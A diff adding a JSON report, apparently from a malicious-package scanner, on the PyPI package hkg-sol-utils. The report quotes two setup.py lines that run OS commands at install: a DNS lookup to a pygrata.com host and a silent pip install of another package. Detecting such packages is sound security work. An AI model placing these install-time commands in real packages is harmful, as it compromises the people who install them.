@@ -1,0 +1,29 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:14",
+                "code": "    subprocess.getoutput('dig @1.1.1.1 install14.api.pygrata.com')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:15",
+                "code": "    subprocess.getoutput('pip install pygrata-utils -U')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/hkg-sol-utils-1.4.0"
+}
